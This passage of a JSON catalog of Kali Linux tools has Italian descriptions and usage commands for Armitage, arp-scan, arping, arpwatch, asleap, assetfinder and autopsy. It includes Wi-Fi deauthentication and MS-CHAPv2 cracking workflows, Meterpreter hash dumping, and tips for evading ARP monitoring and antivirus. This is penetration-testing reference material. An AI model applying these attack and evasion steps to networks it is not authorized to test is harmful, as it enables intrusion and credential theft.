broadcast e randomizza alcuni campi, ma gli hash telefono/email rimangono vulnerabili durante AirDrop attivo.</p><p><strong>Correlazione:</strong> Per il cracking efficace, pre-generare rainbow tables per i prefissi telefonici del paese target (+39 per Italia, +1 per USA, ecc.).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "Bluetooth"
    ],
    "notes": null
  },
  {
    "id": "armitage",
    "name": "armitage",
    "version": "20221206",
    "icon": "../app/icons/armitage-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/armitage/",
    "desc": "GUI per Metasploit che visualizza target, sessioni e facilita attacchi collaborativi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Armitage</strong> è un'interfaccia grafica per Metasploit Framework che semplifica la gestione di penetration test complessi. Visualizza la rete target come un grafo interattivo dove gli host sono colorati per OS (Windows blu, Linux rosso, altri verde) e cambiano icona quando compromessi. Permette di lanciare exploit con pochi click, gestisce sessioni Meterpreter/shell multiple simultaneamente con interfaccia tabbed, e include un team server per operazioni collaborative multi-operatore. Armitage astrae la complessità di Metasploit mantenendo accesso completo alla console per operazioni avanzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Network Visualization:</strong> Rappresenta la rete come grafo interattivo con icone per OS, stato compromissione (fulmine rosso = shell), e relazioni di pivoting. Zoom, pan e raggruppamento automatico per reti grandi.</p><p><strong>Smart Exploitation:</strong> Click destro su host mostra solo exploit applicabili filtrati per OS/servizi rilevati. Ranking automatico per probabilità di successo.</p><p><strong>Hail Mary Attack:</strong> Lancia automaticamente tutti gli exploit applicabili contro target selezionati in parallelo. Utile per CTF o quick wins, ma estremamente rumoroso.</p><p><strong>Session Management:</strong> Interfaccia tabbed per gestire decine di shell simultanee. Meterpreter integrato con file browser, screenshot, keylogger, hashdump accessibili via menu.</p><p><strong>Pivoting Grafico:</strong> Configura route attraverso sessioni compromesse con drag-and-drop. Visualizza i path di pivoting nel grafo.</p><p><strong>Team Server:</strong> Backend dedicato che permette a più operatori di connettersi, condividere sessioni, vedere azioni in tempo reale, e chattare. Logging centralizzato di tutte le operazioni.</p><p><strong>Scripting Cortana:</strong> Linguaggio di scripting integrato per automatizzare workflow complessi, trigger su eventi, e personalizzazione UI.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP STANDALONE ===\n# Inizializza database PostgreSQL per Metasploit\nsudo msfdb init\n\n# Avvia Armitage (gestisce msfrpcd automaticamente)\nsudo armitage\n# Clicca 'Yes' per avviare RPC, attendi connessione\n\n# === SETUP TEAM SERVER ===\n# Sul server centrale\nsudo teamserver 192.168.1.100 SharedPassword123\n# Output: Team server running on 55553\n\n# I client si connettono specificando IP team server\narmitage\n# Host: 192.168.1.100, Port: 55553, Pass: SharedPassword123\n\n# === WORKFLOW DISCOVERY ===\n# Hosts > Nmap Scan > Intense Scan\n# Oppure importa scan esistente: Hosts > Import Hosts\n\n# === EXPLOITATION MANUALE ===\n# 1. Seleziona host nel grafo\n# 2. Click destro > Attack > trova exploit\n# 3. Configura opzioni nel dialog\n# 4. Click 'Launch'\n\n# === POST-EXPLOITATION ===\n# Su host compromesso (icona fulmine):\n# Click destro > Meterpreter > Interact > Meterpreter Shell\n# Click destro > Meterpreter > Access > Dump Hashes\n# Click destro > Meterpreter > Explore > Browse Files\n# Click destro > Meterpreter > Pivoting > Setup\n\n# === AUTOMAZIONE CORTANA ===\n# Armitage > Scripts > Load per caricare script .cna\n# Esempio script per auto-migrate su compromissione:\n# on session_open { migrate($1); }</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale per <strong>Formazione</strong>, permette a studenti di visualizzare concetti di networking e exploitation senza memorizzare sintassi Metasploit.</p><p>In <strong>CTF e Lab</strong>, Hail Mary automatizza l'exploitation di macchine vulnerabili note, accelerando significativamente il tempo di compromissione.</p><p>Per <strong>Team Engagement</strong> con più pentester, il team server centralizza sessioni e log evitando duplicazioni di lavoro e conflitti.</p><p>Utile per <strong>Reporting</strong>: il logging automatico e la visualizzazione grafica facilitano la documentazione del percorso di attacco.</p><p>In <strong>Demo per Management</strong>, la rappresentazione visiva dell'attacco è più comprensibile di output CLI per stakeholder non tecnici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumorosità:</strong> Hail Mary lancia centinaia di exploit in pochi minuti, generando alert massivi su qualsiasi IDS/SIEM. Mai usare in engagement reali.</p><p><strong>Default Signatures:</strong> Armitage usa payload Metasploit standard facilmente rilevati da AV. Per evasion, generare payload custom con msfvenom e caricarli manualmente.</p><p><strong>Team Server Security:</strong> Il traffico team server non è cifrato di default. Usare VPN o SSH tunnel per connessioni remote.</p><p><strong>Database Exposure:</strong> Il database PostgreSQL contiene tutti i dati dell'engagement. Proteggere l'accesso e cancellare dopo il progetto.</p><p><strong>Logging:</strong> Armitage logga tutto in ~/.armitage/. Verificare di non lasciare dati sensibili su sistemi condivisi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "arp-scan",
    "name": "arp-scan",
    "version": "1.10.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/arp-scan/",
    "desc": "Scansiona reti locali via ARP per scoprire host attivi e MAC address.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Arp-scan</strong> è uno strumento di discovery di rete veloce e affidabile che utilizza il protocollo ARP per identificare tutti gli host attivi su una rete locale. A differenza delle scansioni IP/ICMP che possono essere bloccate da firewall host-based, ARP opera a livello 2 (Data Link) ed è obbligatorio per la comunicazione Ethernet - ogni host DEVE rispondere alle ARP request per il proprio IP, rendendo impossibile nascondersi. Questo garantisce la scoperta del 100% dei dispositivi attivi nel segmento di rete, inclusi quelli con firewall restrittivi, modalità stealth, o che non rispondono a ping/portscan.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Layer 2 Discovery:</strong> Invia ARP request e raccoglie le risposte per mappare IP a MAC address. Bypasssa completamente firewall software, ACL, e configurazioni stealth.</p><p><strong>OUI Vendor Lookup:</strong> Correla i primi 3 byte del MAC address al database IEEE OUI per identificare il produttore del dispositivo (Cisco, HP, Apple, ecc.), utile per fingerprinting.</p><p><strong>Duplicate Detection:</strong> Identifica IP duplicati nella rete (possibile indicatore di ARP spoofing o misconfiguration).</p><p><strong>Custom MAC Spoofing:</strong> Permette di specificare un MAC sorgente arbitrario per la scansione, utile per testare NAC o eludere whitelist.</p><p><strong>Bandwidth Control:</strong> Regola la velocità di scansione per evitare flooding su reti sensibili o switch con port security.</p><p><strong>Output Formats:</strong> Supporta output plain, XML per parsing automatico, e integrazione con altri tool.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANSIONE BASE ===\n# Scansione rete locale (auto-detect interfaccia e subnet)\nsudo arp-scan --localnet\n\n# Scansione subnet specifica\nsudo arp-scan 192.168.1.0/24\n\n# Scansione con interfaccia specifica\nsudo arp-scan -I eth0 10.0.0.0/24\n\n# === OPZIONI AVANZATE ===\n# Scansione lenta per evitare detection (100ms tra pacchetti)\nsudo arp-scan --localnet --interval=100\n\n# Retry multipli per host instabili (default: 2)\nsudo arp-scan --localnet --retry=3\n\n# Spoofing MAC sorgente\nsudo arp-scan --localnet --srcaddr=00:11:22:33:44:55\n\n# Scansione range specifico\nsudo arp-scan 192.168.1.100-192.168.1.200\n\n# Scansione da file lista IP\nsudo arp-scan --file=targets.txt\n\n# === OUTPUT E PARSING ===\n# Output solo IP (per pipeline)\nsudo arp-scan --localnet --plain | cut -f1\n\n# Aggiorna database OUI\nsudo arp-scan --update-oui\n\n# === WORKFLOW INTEGRATI ===\n# Discovery + Port scan immediato\nsudo arp-scan --localnet | grep -oP '^\\d+\\.\\d+\\.\\d+\\.\\d+' | xargs -I{} nmap -sV {}\n\n# Trova tutti i dispositivi di un vendor specifico (es. Cisco)\nsudo arp-scan --localnet | grep -i cisco\n\n# Export per analisi\nsudo arp-scan --localnet -x > network_inventory.xml</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Primo passo essenziale in ogni <strong>Internal Network Pentest</strong> per enumerare rapidamente il 100% degli host attivi nella VLAN, inclusi quelli invisibili a scansioni ICMP/TCP.</p><p>Per <strong>Asset Discovery</strong>, identifica dispositivi shadow IT, IoT non autorizzati, e apparati di rete che potrebbero non essere documentati.</p><p>In <strong>Incident Response</strong>, permette di mappare rapidamente tutti i dispositivi su un segmento compromesso per contenimento.</p><p>Utile per <strong>Network Inventory</strong> e compliance, fornendo lista completa IP/MAC/Vendor esportabile per documentazione.</p><p>Nel <strong>Troubleshooting</strong>, rileva conflitti IP e problemi di configurazione DHCP visualizzando MAC duplicati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Scope Limitato:</strong> ARP funziona SOLO sulla stessa VLAN/broadcast domain. Non può attraversare router o VLAN diverse. Per reti segmentate, necessario accesso a ciascun segmento.</p><p><strong>Detection:</strong> Le ARP request sono traffico normale, ma un burst da un singolo MAC può triggerare alert su switch managed o SIEM. Usare --interval per rallentare.</p><p><strong>Port Security:</strong> Switch con port security possono bloccare il MAC se si supera il limite di indirizzi o si usa MAC spoofing.</p><p><strong>ARP Inspection:</strong> Reti con Dynamic ARP Inspection (DAI) possono bloccare scan con MAC spoofato se non corrisponde alla tabella DHCP snooping.</p><p><strong>Logging Switch:</strong> Gli switch enterprise loggano le tabelle MAC. La scansione lascia tracce associabili alla porta fisica.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "arping",
    "name": "arping",
    "version": "2.26",
    "icon": "../app/icons/arping-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/arping/",
    "desc": "Ping ARP per verificare host attivi in rete locale, bypassa firewall IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Arping</strong> è l'equivalente ARP del comando ping ICMP, ma opera a livello 2 (Data Link). Invia richieste ARP Who-has a un indirizzo IP specifico e attende la risposta is-at contenente il MAC address. A differenza del ping ICMP, le ARP request non possono essere bloccate da firewall software perché sono necessarie per il funzionamento base della rete Ethernet. Questo lo rende ideale per verificare la presenza di host \"stealth\" che non rispondono a ping, e per diagnosticare problemi di rete a livello 2.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Host Liveness Check:</strong> Verifica la presenza di un host a livello 2, completamente indipendente da firewall IP/ICMP. Se l'host è fisicamente connesso e ha quell'IP, DEVE rispondere.</p><p><strong>MAC Address Resolution:</strong> Restituisce il MAC address associato all'IP target, permettendo fingerprinting del vendor tramite OUI.</p><p><strong>Duplicate IP Detection:</strong> Modalità DAD (Duplicate Address Detection) rileva se più host rispondono allo stesso IP - indicatore di conflitto di configurazione o attacco ARP spoofing attivo.</p><p><strong>Latency Measurement:</strong> Misura il round-trip time a livello 2, utile per diagnosticare problemi di performance dello switch.</p><p><strong>Gratuitous ARP:</strong> Può inviare ARP gratuite per aggiornare le cache ARP di altri host (usato in failover o testing).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === VERIFICA HOST SINGOLO ===\n# Ping ARP base (continuo fino a Ctrl+C)\nsudo arping 192.168.1.1\n\n# Con count limitato (5 richieste)\nsudo arping -c 5 192.168.1.1\n\n# Specificando interfaccia di rete\nsudo arping -I eth0 192.168.1.1\n\n# === DUPLICATE DETECTION ===\n# Rileva IP duplicati (DAD mode)\nsudo arping -D -c 3 192.168.1.100\n# Exit code 0 = IP libero, 1 = IP già in uso\n\n# === OPZIONI AVANZATE ===\n# Timeout per risposta (default 1s)\nsudo arping -w 5 192.168.1.1\n\n# Solo prima risposta (quit after first reply)\nsudo arping -f 192.168.1.1\n\n# MAC sorgente personalizzato\nsudo arping -s 00:11:22:33:44:55 192.168.1.1\n\n# Broadcast ARP (trova tutti gli host)\nsudo arping -b 192.168.1.255\n\n# === DIAGNOSTICA ===\n# Verifica gateway raggiungibile\nsudo arping -c 3 $(ip route | grep default | awk '{print $3}')\n\n# Script per verificare range\nfor ip in 192.168.1.{1..254}; do\n  sudo arping -c 1 -w 1 $ip 2>/dev/null && echo \"$ip UP\"\ndone</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Network Troubleshooting</strong>, verifica se un host è raggiungibile a livello 2 quando non risponde a ping ICMP, distinguendo problemi di routing da problemi di connettività fisica.</p><p>Per <strong>Security Audit</strong>, la modalità DAD rileva conflitti IP che potrebbero indicare ARP spoofing attivo o misconfiguration DHCP.</p><p>Nel <strong>Pentesting</strong>, conferma la presenza di target stealth che hanno ICMP disabilitato o firewall restrittivi.</p><p>Per <strong>Failover Testing</strong>, verifica che le ARP gratuite propaghino correttamente durante switchover di cluster.</p><p>In <strong>Network Forensics</strong>, correla IP a MAC address per identificare dispositivi specifici durante incident response.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Scope Layer 2:</strong> Funziona SOLO sulla stessa VLAN/broadcast domain. Non può attraversare router.</p><p><strong>Detection:</strong> Richieste ARP ripetute verso un singolo IP possono essere notate da IDS/arpwatch come comportamento anomalo.</p><p><strong>Rate Limiting:</strong> Alcuni switch enterprise limitano il rate di ARP per porta per prevenire flooding.</p><p><strong>Logging:</strong> Le risposte ARP aggiornano le tabelle MAC degli switch, lasciando tracce nei log.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "arpwatch",
    "name": "arpwatch",
    "version": "2.1a15",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/arpwatch/",
    "desc": "Monitora attività ARP per rilevare nuovi host e possibili attacchi ARP spoofing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Arpwatch</strong> è un demone di monitoraggio passivo che osserva tutto il traffico ARP su una rete locale, costruendo e mantenendo un database persistente delle associazioni IP/MAC address. Quando rileva anomalie - nuovi host mai visti, cambio del MAC per un IP esistente (possibile spoofing), o flip-flop rapidi tra MAC diversi - genera alert via email, syslog o script custom. È uno strumento difensivo fondamentale per rilevare attacchi ARP spoofing/poisoning, dispositivi rogue, e cambiamenti non autorizzati nell'infrastruttura di rete.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP/MAC Database:</strong> Mantiene uno storico persistente su disco (arp.dat) delle associazioni IP-MAC osservate, con timestamp del primo e ultimo avvistamento.</p><p><strong>New Station Detection:</strong> Alert quando un nuovo IP o MAC mai visto prima appare sulla rete - possibile dispositivo non autorizzato o attaccante.</p><p><strong>Changed Ethernet Address:</strong> Segnala quando un IP noto cambia MAC address - indicatore classico di ARP spoofing in corso.</p><p><strong>Flip-Flop Detection:</strong> Rileva quando un IP alterna rapidamente tra MAC diversi - tipico di attacchi ARP attivi o problemi di rete.</p><p><strong>Reused Old Ethernet:</strong> Nota quando un MAC precedentemente associato a un IP riappare con IP diverso.</p><p><strong>Multi-Interface Support:</strong> Può monitorare più interfacce simultaneamente con database separati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SETUP BASE ===\n# Avvio monitoraggio su interfaccia\nsudo arpwatch -i eth0\n\n# Avvio come demone con output personalizzato\nsudo arpwatch -i eth0 -f /var/lib/arpwatch/eth0.dat\n\n# === CONFIGURAZIONE ALERTING ===\n# Specifica email per notifiche\nsudo arpwatch -i eth0 -m admin@example.com\n\n# Solo syslog (no email)\nsudo arpwatch -i eth0 -s\n\n# Debug mode (foreground, verbose)\nsudo arpwatch -i eth0 -d\n\n# === GESTIONE DATABASE ===\n# Visualizza database corrente\ncat /var/lib/arpwatch/arp.dat\n# Format: MAC IP timestamp hostname\n\n# Backup database\ncp /var/lib/arpwatch/arp.dat /backup/arp-$(date +%Y%m%d).dat\n\n# Inizializza con scan corrente (baseline)\nsudo arp-scan --localnet | awk '{print $2\"\\t\"$1}' > /var/lib/arpwatch/arp.dat\n\n# === MULTI-VLAN ===\n# Monitora più interfacce\nsudo arpwatch -i eth0 -f /var/lib/arpwatch/eth0.dat &\nsudo arpwatch -i eth1 -f /var/lib/arpwatch/eth1.dat &\n\n# === ANALISI LOG ===\n# Cerca alert di spoofing nei log\ngrep \"changed ethernet address\" /var/log/syslog\ngrep \"flip flop\" /var/log/syslog\n\n# Report nuovi dispositivi ultima settimana\ngrep \"new station\" /var/log/syslog | grep \"$(date -d '7 days ago' +%b)\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Security Monitoring</strong>, rileva attacchi ARP spoofing/MITM in tempo reale, alertando quando un attaccante tenta di impersonare il gateway o altri host critici.</p><p>In <strong>Intrusion Detection</strong>, identifica dispositivi rogue o non autorizzati che appaiono sulla rete interna.</p><p>Per <strong>Asset Management</strong>, mantiene un inventario automatico di tutti i dispositivi che si connettono alla rete con storico temporale.</p><p>In <strong>Compliance</strong> (PCI-DSS, ISO27001), fornisce audit trail delle connessioni di rete richiesto da molti framework.</p><p>Per <strong>Incident Response</strong>, lo storico permette di ricostruire quando un dispositivo compromesso è apparso per la prima volta.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Per Attaccanti:</strong> La presenza di arpwatch significa che attacchi ARP classici (ettercap, bettercap) saranno rilevati immediatamente. Preferire tecniche che non modificano le associazioni ARP (DNS spoofing, WPAD injection, LLMNR poisoning).</p><p><strong>Evasione:</strong> Usare il MAC originale del target durante l'attacco (MAC originale + proxy) per evitare l'alert di \"changed ethernet address\".</p><p><strong>Per Difensori:</strong> Arpwatch vede solo traffico broadcast/unicast alla sua interfaccia. In reti switched, posizionarlo su una porta SPAN/mirror per visibilità completa.</p><p><strong>Limitazioni:</strong> Non rileva attacchi a livelli superiori (DNS, DHCP, LLMNR) che non coinvolgono modifiche ARP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Network_Sniffing"
    ],
    "notes": null
  },
  {
    "id": "asleap",
    "name": "asleap",
    "version": "2.3~git20201128.254acab",
    "icon": "../app/icons/asleap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/asleap/",
    "desc": "Attacca autenticazione LEAP/PPTP estraendo e craccando credenziali MS-CHAPv2.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Asleap</strong> è uno strumento specializzato nell'attacco a protocolli di autenticazione basati su MS-CHAPv2, incluso LEAP (Lightweight Extensible Authentication Protocol) di Cisco e VPN PPTP. La vulnerabilità fondamentale di MS-CHAPv2 sta nell'uso di DES con chiavi derivate dalla password: il challenge-response può essere ridotto a un attacco a soli 2^56 operazioni DES, recuperando la password in chiaro in tempo ragionevole. Nonostante sia deprecato dal 2012 dopo la pubblicazione di Moxie Marlinspike, MS-CHAPv2 rimane diffuso in ambienti enterprise legacy.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MS-CHAPv2 Extraction:</strong> Estrae automaticamente challenge, response e username da catture pcap contenenti traffico LEAP, PPTP, o PEAP/MSCHAPv2.</p><p><strong>Pre-computed Tables:</strong> Usa tabelle hash pre-generate (genkeys) per cracking istantaneo di password comuni, evitando computazione ripetuta.</p><p><strong>Dictionary Attack:</strong> Attacco basato su wordlist ottimizzato per la struttura di MS-CHAPv2, più veloce del brute force.</p><p><strong>Live Sniffing:</strong> Modalità real-time che sniffa il traffico wireless e attacca le autenticazioni al volo durante la cattura.</p><p><strong>Username Extraction:</strong> Estrae gli username in chiaro dai pacchetti, fornendo la metà delle credenziali gratuitamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === PREPARAZIONE TABELLE ===\n# Genera tabelle hash da dizionario (una tantum, riutilizzabile)\ngenkeys -r /usr/share/wordlists/rockyou.txt -f wordlist.dat -n index.dat\n# Può richiedere ore per dizionari grandi, ma il risultato è riutilizzabile\n\n# Per password numeriche (PIN)\ngenkeys -r <(seq -w 00000000 99999999) -f pins.dat -n pins_index.dat\n\n# === CATTURA TRAFFICO LEAP/MSCHAPV2 ===\n# Metti interfaccia in monitor mode\nairmon-ng start wlan0\n\n# Cattura traffico sulla rete target (canale specifico)\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon\n\n# Forza ri-autenticazione con deauth (per catturare handshake)\naireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n\n# === CRACKING OFFLINE ===\n# Crack da cattura pcap con tabelle pre-generate\nasleap -r capture-01.cap -f wordlist.dat -n index.dat\n\n# Output esempio:\n# username: DOMAIN\\jsmith\n# challenge: 1a2b3c4d5e6f7890\n# response: 0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b\n# password: Summer2023!\n\n# === ATTACK LIVE ===\n# Sniff e crack in tempo reale\nasleap -i wlan0mon -f wordlist.dat -n index.dat\n\n# === CATTURA VPN PPTP ===\n# Sniffa traffico PPTP (GRE encapsulated)\ntcpdump -i eth0 -w pptp.pcap 'proto gre'\n\n# Estrai e cracca\nasleap -r pptp.pcap -f wordlist.dat -n index.dat\n\n# === WORKFLOW COMPLETO ===\n# 1. Identifica reti LEAP\nairodump-ng wlan0mon | grep LEAP\n\n# 2. Focus sulla rete target e cattura\nairodump-ng -c [CH] --bssid [BSSID] -w leap_capture wlan0mon\n\n# 3. Deauth per forzare handshake\naireplay-ng --deauth 3 -a [BSSID] wlan0mon\n\n# 4. Cracca\nasleap -r leap_capture-01.cap -f wordlist.dat -n index.dat</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting Enterprise</strong>, attacca reti legacy che usano ancora LEAP nonostante sia deprecato da oltre un decennio.</p><p>Per <strong>VPN Assessment</strong>, dimostra la debolezza di PPTP/MS-CHAPv2 e la necessità di migrare a IKEv2/IPsec o OpenVPN.</p><p>In <strong>Compliance Audit</strong>, identifica l'uso di protocolli non più considerati sicuri che violano best practice (NIST, PCI-DSS).</p><p>Per <strong>Red Team</strong>, le credenziali Wi-Fi enterprise spesso coincidono con quelle Active Directory, fornendo accesso alla rete interna.</p><p>In <strong>Security Awareness</strong>, demo pratica di perché \"enterprise WiFi = sicuro\" è un falso mito se usa protocolli obsoleti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requisiti Cattura:</strong> Necessario catturare un handshake completo. Per LEAP wireless, serve monitor mode e spesso deauthentication per forzare ri-autenticazione.</p><p><strong>Deauth Detection:</strong> I deauth frames sono rilevabili da WIDS (Wireless IDS). Limitare il numero e distanziare nel tempo.</p><p><strong>Password Strength:</strong> L'attacco è efficace solo se la password è nel dizionario. Password complesse richiedono CloudCracker o simili servizi.</p><p><strong>Alternative Moderne:</strong> PEAP con certificato client o EAP-TLS sono immuni a questo attacco. Verificare il metodo EAP effettivo.</p><p><strong>Tempo di Crack:</strong> Con tabelle pre-generate e password nel dizionario, il crack è istantaneo. Senza tabelle, genkeys richiede ore.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "assetfinder",
    "name": "assetfinder",
    "version": "0.1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/assetfinder/",
    "desc": "Trova sottodomini e asset correlati a un dominio usando fonti passive.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Assetfinder</strong> è un tool di subdomain enumeration passiva estremamente veloce, scritto in Go da tomnomnom. Interroga simultaneamente multiple fonti di dati pubblici - Certificate Transparency logs (crt.sh, Certspotter, Facebook CT), DNS passivo, e threat intelligence feeds (VirusTotal) - per raccogliere tutti i sottodomini storicamente associati a un dominio. Non invia MAI traffico diretto al target, garantendo zero footprint e stealth totale. L'output pulito (un risultato per riga) lo rende ideale per pipeline con altri tool di reconnaissance.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Aggregation:</strong> Query parallele a crt.sh, Certspotter, HackerTarget, ThreatCrowd, URLScan, VirusTotal, Facebook CT per massima copertura.</p><p><strong>Certificate Transparency:</strong> Sfrutta i log CT obbligatori per tutti i certificati SSL pubblici - ogni certificato emesso rivela i domini associati.</p><p><strong>Related Domains:</strong> Trova anche domini correlati (stessa organizzazione, stesso certificato wildcard) oltre ai sottodomini diretti.</p><p><strong>Zero Footprint:</strong> Nessun traffico verso il target - tutte le query vanno a terze parti che indicizzano dati pubblici.</p><p><strong>Pipeline-Ready:</strong> Output pulito senza header/footer, un risultato per riga, deduplicato automaticamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === ENUMERAZIONE BASE ===\n# Tutti i domini correlati (include parent domain, related orgs)\nassetfinder target.com\n\n# Solo sottodomini stretti (esclude domini correlati)\nassetfinder --subs-only target.com\n\n# === PIPELINE RECONNAISSANCE ===\n# Enumera -> Verifica alive -> Scan vulnerabilità\nassetfinder --subs-only target.com | httprobe | nuclei -t cves/\n\n# Enumera -> Screenshot per review manuale\nassetfinder --subs-only target.com | httprobe | gowitness file -f -\n\n# Enumera -> Trova endpoint interessanti\nassetfinder --subs-only target.com | httprobe | waybackurls | grep -E '\\.(js|json|xml|config)$'\n\n# === MULTI-TARGET ===\n# Enumera lista di domini\ncat domains.txt | xargs -I{} assetfinder --subs-only {} | sort -u > all_subs.txt\n\n# Bug bounty scope check\ncat scope.txt | while read domain; do\n  echo \"=== $domain ===\"\n  assetfinder --subs-only $domain | wc -l\ndone\n\n# === OUTPUT E ANALISI ===\n# Salva e conta\nassetfinder --subs-only target.com | tee subs.txt | wc -l\n\n# Trova pattern comuni\nassetfinder --subs-only target.com | cut -d. -f1 | sort | uniq -c | sort -rn | head -20\n\n# Identifica ambienti (dev, staging, test)\nassetfinder --subs-only target.com | grep -E '(dev|test|stage|uat|qa|sandbox)'\n\n# === COMBINAZIONE CON ALTRI TOOL ===\n# Unisci risultati da più fonti\n(assetfinder --subs-only target.com; subfinder -d target.com -silent) | sort -u\n\n# Verifica quali risolvono\nassetfinder --subs-only target.com | dnsx -silent | httpx -silent\n\n# Enumera -> Portscan servizi comuni\nassetfinder --subs-only target.com | dnsx -silent -a | nmap -iL - -p80,443,8080,8443 -sV</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Primo passo in ogni <strong>Reconnaissance</strong> per ottenere rapidamente una baseline di asset noti prima di approfondire con tool attivi.</p><p>Per <strong>Bug Bounty</strong>, la velocità permette di enumerare decine di target in minuti. Pipeline con httprobe+nuclei trova vulnerabilità note automaticamente.</p><p>In <strong>Attack Surface Management</strong>, discovery periodica di nuovi sottodomini che appaiono nei CT logs.</p><p>Per <strong>Red Team</strong>, identifica sottodomini dimenticati (dev, test, old) che potrebbero avere configurazioni deboli.</p><p>In <strong>Threat Intelligence</strong>, i domini correlati rivelano infrastruttura collegata all'organizzazione target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Copertura Limitata:</strong> Dipende dalla completezza delle fonti esterne. Non trova sottodomini mai apparsi in certificati o DNS pubblico. Combinare con amass, subfinder, e brute force per copertura completa.</p><p><strong>Dati Storici:</strong> I risultati includono sottodomini che potrebbero non esistere più. Sempre verificare con dnsx/httprobe prima di procedere.</p><p><strong>Rate Limiting:</strong> Alcune fonti (VirusTotal) richiedono API key per query illimitate. Senza key, risultati parziali.</p><p><strong>Zero Footprint:</strong> Il target non vede alcun traffico, ma le fonti terze (crt.sh, etc.) loggano le query. Per anonimato, usare Tor o VPN.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "autopsy",
    "name": "autopsy",
    "version": "2.24",
    "icon": "../app/icons/autopsy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/autopsy/",
    "desc": "Piattaforma forense open source per analisi di immagini disco, timeline e carving.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Autopsy</strong> è la piattaforma forense digitale open source più utilizzata al mondo, sviluppata da Basis Technology. Fornisce un'interfaccia grafica completa per l'analisi di immagini disco, costruita sopra The Sleuth Kit (TSK) e integrata con decine di moduli specializzati. Permette agli investigatori di esaminare filesystem (NTFS, FAT, EXT, HFS+), recuperare file cancellati, costruire timeline di attività, analizzare artefatti di sistema (Registry, prefetch, eventi), browser, email e dispositivi mobili, tutto in un workflow documentabile per procedimenti legali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-User Collaboration:</strong> Supporta casi multi-investigatore con database centralizzato PostgreSQL per team che lavorano sullo stesso caso.</p><p><strong>Timeline Analysis:</strong> Costruisce cronologia unificata MAC times (Modified, Accessed, Changed) di tutti i file, eventi Windows, log applicativi per ricostruire sequenze di azioni.</p><p><strong>File Carving:</strong> Modulo PhotoRec integrato recupera file cancellati dallo spazio non allocato usando signature database di centinaia di formati.</p><p><strong>Artifact Extraction:</strong> Moduli specializzati per browser (Chrome, Firefox, Edge, IE), email (Outlook, Thunderbird), messaggistica (Skype, WhatsApp backup), social media e registry Windows.</p><p><strong>Hash Analysis:</strong> Calcola MD5/SHA1/SHA256 di ogni file, confronta con database di hash noti (NSRL, custom hashsets) per identificare file di sistema 